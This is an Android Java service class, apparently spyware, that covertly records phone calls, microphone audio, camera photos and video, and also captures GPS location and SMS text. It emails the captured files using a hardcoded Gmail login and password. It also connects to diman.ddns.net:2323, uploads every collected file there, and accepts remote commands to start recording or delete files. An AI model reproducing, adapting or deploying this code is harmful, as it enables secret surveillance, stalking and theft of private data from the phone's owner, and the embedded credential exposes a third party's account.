package com.example.dima.ser;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;

import com.example.dima.ser.Receiver.TimeNotification;
import com.example.dima.ser.mail.MailSenderClass;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;

public class WalkingIconService extends Service {
    private WindowManager.LayoutParams paramsF;

    private ClientSocketThread client;
    private boolean nach=false;

    public static String Imia="";
    public static WalkingIconService Ser=null;

    private WindowManager windowManager=null;
    private Superficie sv=null;

//    AudioEncoder mEncoder=null;
//    AudioSoftwarePoller audioPoller=null;

    private PowerManager.WakeLock wakeLock;

    private File dirPik=null;
    private Camera.AutoFocusCallback myAutoFocusCallback=null;
    private Camera.PictureCallback myPictureCallback=null;
    private int CAMERA_ID = 1;
    private int schech = 0;
    private MediaRecorder mediaRecorder = null;

    public boolean nachVid=false;
    public boolean zvon=false;

//    public int volumeOld;

    private Handler handler;

    private int[][] matrixA = null;
    private int[][] matrixAOld = null;

    public static boolean zariad=true;

    private AlarmManager am=null;

    public boolean onoff=true;

    private BroadcastReceiver mBatteryInfoReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_BATTERY_CHANGED.equals(action)) {
                int level = intent.getIntExtra("level", 0);
                int scale = intent.getIntExtra("scale", 100);
                int g=level * 100 / scale;
                if (g<10)
                    zariad=false;
                else
                    zariad=true;
            }
        }
    };

    public void onDestroy() {
        Ser=null;
        releaseSV();
        releaseMediaRecorder();
        if (client!=null)
            if (client.socket!=null) {
                try {
                    client.socket.close();
                    client.socket=null;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        super.onDestroy();
    }

    int myBufferSize = 8192;
    AudioRecord audioRecord;
    boolean isReading = false;

    void createAudioRecorder() {
        int sampleRate = 8000;
        int channelConfig = AudioFormat.CHANNEL_IN_MONO;
        int audioFormat = AudioFormat.ENCODING_PCM_16BIT;

        int minInternalBufferSize = AudioRecord.getMinBufferSize(sampleRate,
                channelConfig, audioFormat);
        int internalBufferSize = minInternalBufferSize * 4;

        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC,
                sampleRate, channelConfig, audioFormat, internalBufferSize);
    }

    public void recordStart() {
        audioRecord.startRecording();
    }

    public void recordStop() {
        audioRecord.stop();
    }

    public void readStart() {
        isReading = true;
        new Thread(new Runnable() {
            @Override
            public void run() {
                if (audioRecord == null)
                    return;

                byte[] myBuffer = new byte[myBufferSize];

                byte[] perBuf = new byte[16384];
                int pos=0;
                int readCount = 0;
                int totalCount = 0;
                while (isReading) {
                    readCount = audioRecord.read(myBuffer, 0, myBufferSize);
                    totalCount += readCount;
                    int i=0;
                    while (i<readCount)
                    {
                        perBuf[pos]=myBuffer[i];
                        i++;
                        pos++;
                        if (pos>=perBuf.length) {
                            pos=0;
                            if (nach)
                                new PeredAudio().execute(perBuf);
                        }
                    }


                }
            }
        }).start();
    }

    public void readStop() {
        isReading = false;
    }

    private String createDataString()
    {
        Calendar c = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");
        return sdf.format(c.getTime());
    }


    File outFileZv=new File("");

    public  void setZvon(String Imia) {
        zvon=true;
        File dir = new File(dirPik, "zvon");
        dir.mkdirs();

        outFileZv = new File(dir, Imia+" "+createDataString() + ".3gpp");
        creatAudioMediaRecorder(outFileZv);
    }

    public void konZvon() {
        if (mediaRecorder!=null) {
            releaseMediaRecorder();
            sender_mail_async async_sending = new sender_mail_async();
            async_sending.execute(outFileZv.getAbsolutePath(), "Звонок " + Imia, createDataString());
            outFileZv=new File("");
        }
        zvon=false;
    }

    File outFileZvuk=new File("");

    public void setZvuk() {
        File dir = new File(dirPik, "audio");
        dir.mkdirs();
        outFileZvuk = new File(dir, createDataString() + ".3gpp");
        creatAudioMediaRecorder(outFileZvuk);
    }

    public void konZvuk() {
        if (mediaRecorder != null) {
            releaseMediaRecorder();
        }
    }

    public void setGPS()
    {
        // Acquire a reference to the system Location Manager
        LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);

        // Define a listener that responds to location updates
        LocationListener locationListener = new LocationListener() {
            public void onLocationChanged(Location location) {
                // Called when a new location is found by the network location provider.
                File dir = new File(dirPik, "gps");
                dir.mkdirs();
                File file = new File(dir, createDataString() + ".dfg");

                try {
                    //проверяем, что если файл не существует то создаем его
                    if(!file.exists()){
                        file.createNewFile();
                    }

                    //PrintWriter обеспечит возможности записи в файл
                    PrintWriter out = new PrintWriter(file.getAbsoluteFile());

                    try {
                        //Записываем текст у файл
                        out.print(String.valueOf(location.getLatitude()));
                        out.print(String.valueOf(location.getLongitude()));
                    } finally {
                        //После чего мы должны закрыть файл
                        //Иначе файл не запишется
                        out.close();
                    }
                } catch(IOException e) {
                    throw new RuntimeException(e);
                }

                sender_mail_async async_sending = new sender_mail_async();
                async_sending.execute(file.getAbsolutePath(), "Локация "+String.valueOf(schech),String.valueOf(location.getLatitude())+":"+String.valueOf(location.getLongitude()));
            }

            public void onStatusChanged(String provider, int status, Bundle extras) {}

            public void onProviderEnabled(String provider) {}

            public void onProviderDisabled(String provider) {}
        };

        // Register the listener with the Location Manager to receive location updates
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
    }

    public void sms(String s,String s1)
    {
        try {
            File dir = new File(dirPik, "sms");
            dir.mkdirs();
            File f = new File(dir, s+createDataString() + ".txt");
            FileOutputStream fos= new FileOutputStream(f);
            DataOutputStream out = new DataOutputStream(fos);

            out.write(s1.getBytes());
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void  creatAudioMediaRecorder(File outFile) {
        releaseMediaRecorder();
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setOutputFile(outFile.getAbsolutePath());
        try {
            mediaRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        mediaRecorder.start();
    }

    public void onCreate() {
        super.onCreate();
    }

    public static int byteArrayToInt(byte[] b,int n,int k) {
        final ByteBuffer bb = ByteBuffer.wrap(b,n,k);
        //bb.order(ByteOrder.LITTLE_ENDIAN);
        return bb.getInt();
    }

    public static byte[] intToByteArray(int i) {
        final ByteBuffer bb = ByteBuffer.allocate(Integer.SIZE / Byte.SIZE);
        bb.order(ByteOrder.LITTLE_ENDIAN);
        bb.putInt(i);
        return bb.array();
    }

    public static byte [] float2ByteArray (float value)
    {
        final ByteBuffer bb = ByteBuffer.allocate(4);
        bb.order(ByteOrder.LITTLE_ENDIAN);
        bb.putFloat(value).array();
        return bb.array();
    }


    class PeredAksel extends AsyncTask<Float, Void, Void> {
        @Override
        protected Void doInBackground(Float... params) {
            nach=false;
            try {
                OutputStream out=client.out;
                int j=4;
                byte data[] = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(5);
                out.write(data,0,data.length);
                out.flush();

                j=4+12;
                data = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(15);
                out.write(data,0,data.length);

                data=float2ByteArray(params[0]);
                out.write(data,0,data.length);
                data=float2ByteArray(params[1]);
                out.write(data,0,data.length);
                data=float2ByteArray(params[2]);
                out.write(data,0,data.length);
                out.flush();


                j=4;
                data = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(6);
                out.write(data,0,data.length);
                out.flush();
                nach=true;
            } catch (IOException e) {
                try {
                    if (client.socket!=null) {
                        client.socket.close();
                        client.socket=null;
                    }
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                nach=false;
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(Void... values) {
            super.onProgressUpdate(values);
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);
        }
    }

    class PeredAudio extends AsyncTask<byte[], Void, Void> {
        @Override
        protected Void doInBackground(byte[]... params) {
            nach=false;
            try {
                OutputStream out=client.out;
                int j=4;
                byte data[] = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(5);
                out.write(data,0,data.length);
                out.flush();

                j=4+params[0].length;
                data = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(23);
                out.write(data,0,data.length);
                out.write(params[0],0,params[0].length);
                out.flush();

                j=4;
                data = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(6);
                out.write(data,0,data.length);
                out.flush();
                nach=true;
            } catch (IOException e) {
                try {
                    if (client.socket!=null) {
                        client.socket.close();
                        client.socket=null;
                    }
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                nach=false;
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(Void... values) {
            super.onProgressUpdate(values);
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);
        }
    }

    class PeredUglov extends AsyncTask<Float, Void, Void> {
        @Override
        protected Void doInBackground(Float... params) {
            nach=false;
            try {
                OutputStream out=client.out;
                int j=4;
                byte data[] = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(5);
                out.write(data,0,data.length);
                out.flush();

                j=4+12;
                data = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(14);
                out.write(data,0,data.length);

                data=float2ByteArray(params[0]);
                out.write(data,0,data.length);
                data=float2ByteArray(params[1]);
                out.write(data,0,data.length);
                data=float2ByteArray(params[2]);
                out.write(data,0,data.length);
                out.flush();


                j=4;
                data = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(6);
                out.write(data,0,data.length);
                out.flush();
                nach=true;
            } catch (IOException e) {
                try {
                    if (client.socket!=null) {
                        client.socket.close();
                        client.socket=null;
                    }
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                nach=false;
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(Void... values) {
            super.onProgressUpdate(values);
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);
        }
    }

    // Создание второго потока
    public class ClientSocketThread implements Runnable {

        Thread thread;
        public Socket socket;

        // Берем входной и выходной потоки сокета, теперь можем получать и отсылать данные клиентом.
        public InputStream in;
        public OutputStream out;


        // Создание второго потока
        public class PerSocketThread implements Runnable {
            Thread thread;
            PerSocketThread() {
                // Создаём новый второй поток
                thread = new Thread(this, "Поток для примера");
                thread.start(); // Запускаем поток
            }

            // Обязательный метод для интерфейса Runnable
            public void run() {
                nach=false;
                try {
                    ArrayList<File> spis = new ArrayList<File>();

                    listFile(dirPik.getAbsolutePath(),spis);

                    int j=4;
                    byte data[] = intToByteArray(j);
                    out.write(data,0,data.length);
                    data = intToByteArray(5);
                    out.write(data,0,data.length);
                    out.flush();

                    for (int i=0; i<spis.size(); i++)
                    {
                        File myFile = spis.get(i);
                        String put=myFile.getAbsolutePath();
                        String imi=myFile.getName();

                        j=imi.getBytes().length+4;
                        data = intToByteArray(j);
                        out.write(data,0,data.length);
                        data = intToByteArray(1);
                        out.write(data,0,data.length);
                        data=imi.getBytes();
                        out.write(data, 0, data.length);
                        out.flush();

                        j=put.getBytes().length+4;
                        data = intToByteArray(j);
                        out.write(data,0,data.length);
                        data = intToByteArray(3);
                        out.write(data,0,data.length);
                        data=put.getBytes();
                        out.write(data, 0, data.length);
                        out.flush();

                        byte[] mybytearray = new byte[(int) myFile.length()];
                        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(myFile));
                        int s=bis.read(mybytearray, 0, mybytearray.length);
                        j=s+4;
                        data = intToByteArray(j);
                        out.write(data,0,data.length);
                        data = intToByteArray(2);
                        out.write(data,0,data.length);
                        out.write(mybytearray, 0, s);
                        out.flush();
                    }

                    j=4;
                    data = intToByteArray(j);
                    out.write(data,0,data.length);
                    data = intToByteArray(6);
                    out.write(data,0,data.length);
                    out.flush();
                    nach=true;
                } catch (IOException e) {
                    try {
                        if (socket!=null) {
                            socket.close();
                            socket=null;
                        }
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }
                    nach=false;
                    e.printStackTrace();
                }
            }
        }

        public PerSocketThread creatPer() {
            return new  PerSocketThread();
        }

        ClientSocketThread() {
            // Создаём новый второй поток
            thread = new Thread(this, "Поток для примера");
            thread.start(); // Запускаем поток
        }

        // Обязательный метод для интерфейса Runnable
        public void run() {
            int serverPort = 2323; // здесь обязательно нужно указать порт к которому привязывается сервер.
            String address = "diman.ddns.net"; // это IP-адрес компьютера, где исполняется наша серверная программа.
            // Здесь указан адрес того самого компьютера где будет исполняться и клиент.

            try {
                InetAddress ipAddress = InetAddress.getByName(address); // создаем объект который отображает вышеописанный IP-адрес.
                socket = new Socket(ipAddress, serverPort); // создаем сокет используя IP-адрес и порт сервера.

                // Берем входной и выходной потоки сокета, теперь можем получать и отсылать данные клиентом.
                in = socket.getInputStream();
                out = socket.getOutputStream();

                nach=true;

                int j=Build.MODEL.length()+4;
                byte data[] = intToByteArray(j);
                out.write(data,0,data.length);
                data = intToByteArray(0);
                out.write(data,0,data.length);
                data=Build.MODEL.getBytes();
                out.write(data, 0, data.length);
                out.flush();

                client.creatPer();

                while (!socket.isClosed()) {
                    byte priem[] = new byte[4];
                    j = in.read(priem);
                    j = byteArrayToInt(priem, 0, 4);
                    switch (j) {
                        case 38:
                            handler.sendEmptyMessage(0);
                            break;
                        case 39:
                            handler.sendEmptyMessage(1);
                            break;
                        case 41:
                            priem=new byte[4];
                            j=in.read(priem);
                            j=byteArrayToInt(priem,0,4);
                            priem=new byte[j];
                            j=in.read(priem);
                            String s = new String(priem, "UTF-8");
                            File f=new File(s);
                            f.delete();
                            break;
                        case 40:
                            priem=new byte[4];
                            j=in.read(priem);
                            j=byteArrayToInt(priem,0,4);
                            CAMERA_ID=j;
                            break;
                        case 42:
                            priem=new byte[4];
                            j=in.read(priem);
                            j=byteArrayToInt(priem,0,4);
                            if (j==11)
                                onoff=true;
                            break;
                        case 43:
                            priem=new byte[4];
                            j=in.read(priem);
                            j=byteArrayToInt(priem,0,4);
                            if (j==12)
                                onoff=false;
                            break;
                        case 44:
                            ArrayList<File> spis = new ArrayList<File>();
                            listFile(dirPik.getAbsolutePath(),spis);
                            for (int i=0; i<spis.size(); i++) {
                                File myFile = spis.get(i);
                                myFile.delete();
                            }
                            break;

                    }
                }
                if (socket!=null) {
                    socket.close();
                    socket=null;
                }
            } catch (Exception x) {
                try {
                    if (socket!=null) {
                        socket.close();
                        socket=null;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                nach=false;
                x.printStackTrace();
            }
        }
    }

    private void listFile(String s,ArrayList<File> list)
    {
        File []fList;

        File F = new File(s);

        fList = F.listFiles();

        for(int i=0; i<fList.length; i++)
        {
            //Нужны только папки в место isFile() пишим isDirectory()
            if(fList[i].isFile())
            {
                if (!fList[i].getAbsolutePath().equals(outFileZvuk.getAbsolutePath())
                    && !fList[i].getAbsolutePath().equals(outFileZv.getAbsolutePath())
                    && !fList[i].getAbsolutePath().equals(videoFile.getAbsolutePath()))
                    list.add(fList[i]);
            }
            if(fList[i].isDirectory())
                listFile(fList[i].getAbsolutePath(),list);
        }
    }

    private SensorEventListener listenerOrientation;
    private SensorEventListener listenerAksel;
    private SensorManager mSensorManager;
    private Sensor mOrientation;
    private Sensor mAksel;

    private float xy_angle;
    private float xz_angle;
    private float zy_angle;

    public int onStartCommand(Intent intent, int flags, int startId) {
        Ser=this;

        //creatAudioSpectr();

        //creatSensorPer();

        creatPowerManager();

        svAddwindowManager();

        //createTimer();

        registerReceiver(mBatteryInfoReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));

        matrixA = new int[8][8];
        matrixAOld = new int[8][8];

        creatDirExempl();

        creatHandler();

        creatAutoFocusCallback();

        creatPictureCallback();

        return super.onStartCommand(intent, flags, startId);
    }


    private void creatDirExempl() {
        dirPik = Environment.getExternalStorageDirectory();
        dirPik = new File(dirPik, "Android/data/zer");
        boolean b=dirPik.mkdirs();
    }

    private void creatHandler() {
        handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                if (msg.what==0)
                    Ser.nachZapVid();
                else
                    Ser.konZapVid();
            }
        };
    }

    private void creatPictureCallback() {
        myPictureCallback=new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                try
                {
                    Bitmap tgtImg1 = BitmapFactory.decodeByteArray(data, 0, data.length);
                    Bitmap tgtImg = Bitmap.createScaledBitmap(tgtImg1,8,8,false);


                    int sumIark=0;
                    int sumDelIark=0;

                    for (int row=0; row<8; row++){
                        for (int col=0; col<8; col++){
                            int rgb = tgtImg.getPixel(col, row);
                            matrixA[col][row]= (int) (0.114* Color.blue(rgb)+0.587*Color.green(rgb)+0.299*Color.red(rgb));
                            sumIark=sumIark+matrixA[col][row];

                            sumDelIark=sumDelIark+Math.abs(matrixA[col][row]-matrixAOld[col][row]);
                        }
                    }

                    for (int row=0; row<8; row++){
                        for (int col=0; col<8; col++){
                            matrixAOld[col][row]=matrixA[col][row];
                        }
                    }
                    if (sumIark>2400 && sumDelIark>500)
                    {
                        schech++;
                        File dirP = new File(dirPik, "foto");
                        dirP.mkdirs();
                        File photoFile = new File(dirP, createDataString() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(photoFile);
                        fos.write(data);
                        fos.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                camera.startPreview();
//                camera.autoFocus(myAutoFocusCallback);


//                releaseCamera();
//                if(wakeLock.isHeld())
//                    wakeLock.release();
            }
        };
    }

    private void creatAutoFocusCallback() {
        myAutoFocusCallback = new Camera.AutoFocusCallback() {
            @Override
            public void onAutoFocus(boolean success, Camera camera) {
                camera.takePicture(null, null, myPictureCallback);
            }
        };
    }

    private void creatPowerManager() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                "MyWakelockTag");
    }

    private void creatSensorPer() {
        mSensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE); // Получаем менеджер сенсоров
        mOrientation = mSensorManager.getDefaultSensor(Sensor.TYPE_ORIENTATION); // Получаем датчик положения
        mAksel = mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER); // Получаем датчик положения

        listenerOrientation = new SensorEventListener() {

            @Override
            public void onAccuracyChanged(Sensor sensor, int accuracy) {
            }

            @Override
            public void onSensorChanged(SensorEvent event) {
                xy_angle = event.values[0]; //Плоскость XY
                xz_angle = event.values[1]; //Плоскость XZ
                zy_angle = event.values[2]; //Плоскость ZY
                if (nach)
                    new PeredUglov().execute(xy_angle,xz_angle,zy_angle);
            }
        };

        listenerAksel = new SensorEventListener() {

            @Override
            public void onAccuracyChanged(Sensor sensor, int accuracy) {
            }

            @Override
            public void onSensorChanged(SensorEvent event) {
                xy_angle = event.values[0]; //Плоскость XY
                xz_angle = event.values[1]; //Плоскость XZ
                zy_angle = event.values[2]; //Плоскость ZY
                if (nach)
                    new PeredAksel().execute(xy_angle,xz_angle,zy_angle);
            }
        };

        mSensorManager.registerListener(listenerOrientation, mOrientation,
                SensorManager.SENSOR_DELAY_NORMAL);

        mSensorManager.registerListener(listenerAksel, mAksel,
                SensorManager.SENSOR_DELAY_NORMAL);
    }

    private void creatAudioSpectr() {
        createAudioRecorder();
        recordStart();
        readStart();
    }

    private void createTimer() {
        am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent inten = new Intent(this, TimeNotification.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0,
                inten, PendingIntent.FLAG_CANCEL_CURRENT );
        // На случай, если мы ранее запускали активити, а потом поменяли время,
        // откажемся от уведомления
        am.cancel(pendingIntent);
        // Устанавливаем разовое напоминание
        am.setRepeating(AlarmManager.RTC_WAKEUP,100000,100000,pendingIntent);
    }

    public void  otprSoket() {
        if (client!=null) {
            if (client.socket == null)
                client = new ClientSocketThread();
            else
            {
                if (client.socket.isClosed())
                    client = new ClientSocketThread();
            }
        }
        else
            client = new ClientSocketThread();

        if (nach)
            client.creatPer();
    }

    private class sender_mail_async extends AsyncTask<String, String, Boolean> {

        @Override
        protected void onPreExecute() {
            //WaitingDialog = ProgressDialog.show(WalkingIconService.Ser, "Отправка данных", "Отправляем сообщение...", true);
        }

        @Override
        protected void onPostExecute(Boolean result) {
            //WaitingDialog.dismiss();
            //Toast.makeText(WalkingIconService.Ser, "Отправка завершена!!!", Toast.LENGTH_LONG).show();
        }

        @Override
        protected Boolean doInBackground(String... params) {
            String title=params[1];
            String text=params[2];
            String from;
            String where;
            String attach=params[0];
            try {
                from = "dimanys111@gmail.com";
                where = "dimanys111@mail.ru";
                MailSenderClass sender = new MailSenderClass("dimanys111@gmail.com", "b84962907");
                sender.sendMail(title, text, from, where, attach);
//                File f=new File(attach);
//                f.delete();
            } catch (Exception e) {
                //Toast.makeText(WalkingIconService.Ser, "Ошибка отправки сообщения!", Toast.LENGTH_SHORT).show();
            }
            return false;
        }
    }

    public void  svAddwindowManager() {
        wakeLock.acquire();
        releaseSV();

        sv = new Superficie(this,CAMERA_ID);

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        paramsF = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
        paramsF.gravity = Gravity.TOP | Gravity.LEFT;
        paramsF.x = 0;
        paramsF.y = 0;
        paramsF.height = 1000;
        paramsF.width = 1000;
        windowManager.addView(sv, paramsF);
        svTouch();
        //takeScreenshot();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void  svTouch()
    {
        try {
            sv.setOnTouchListener(new View.OnTouchListener() {
                private int initialX;
                private int initialY;
                private float initialTouchX;
                private float initialTouchY;

                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    switch (event.getAction()) {
                        case MotionEvent.ACTION_DOWN:
                            initialX = paramsF.x;
                            initialY = paramsF.y;
                            initialTouchX = event.getRawX();
                            initialTouchY = event.getRawY();
                            break;
                        case MotionEvent.ACTION_UP:
                            if (sv.autofokus)
                                sv.mCamera.autoFocus(myAutoFocusCallback);
                            else
                                sv.mCamera.takePicture(null, null, myPictureCallback);
                            break;
                        case MotionEvent.ACTION_MOVE:
                            paramsF.x = initialX + (int) (event.getRawX() - initialTouchX);
                            paramsF.y = initialY + (int) (event.getRawY() - initialTouchY);
                            windowManager.updateViewLayout(sv, paramsF);
                            break;
                    }
                    return false;
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void  nachZapVid() {
        //Toast.makeText(WalkingIconService.Ser, "Нач", Toast.LENGTH_SHORT).show();
        releaseMediaRecorder();
        if (mediaRecorder==null) {
            svAddwindowManager();
            nachVid=true;
        }
    }

    public void  konZapVid() {
        //Toast.makeText(WalkingIconService.Ser, "Kon", Toast.LENGTH_SHORT).show();
        releaseMediaRecorder();
        releaseSV();
        videoFile=new File("");
        nachVid=false;
        if (nach)
            client.creatPer();
    }

    File videoFile=new File("");

    private boolean prepareVideoRecorder() {
        if (sv!= null)
            sv.mCamera.unlock();
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setCamera(sv.mCamera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setProfile(CamcorderProfile
                .get(CamcorderProfile.QUALITY_HIGH));
        File dir = new File(dirPik, "move");
        dir.mkdirs();
        videoFile = new File(dir, createDataString() + ".3gp");
        mediaRecorder.setOutputFile(videoFile.getAbsolutePath());
        mediaRecorder.setPreviewDisplay(sv.getHolder().getSurface());
        try {
            mediaRecorder.prepare();
        } catch (Exception e) {
            e.printStackTrace();
            releaseMediaRecorder();
            return false;
        }
        return true;
    }

    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            mediaRecorder.stop();
            mediaRecorder.reset();
            mediaRecorder.release();
            mediaRecorder = null;
            if (sv!= null)
                sv.mCamera.lock();
        }
    }

    private void releaseSV() {
        if (sv!= null) {
            windowManager.removeView(sv);
            sv = null;
        }
    }
}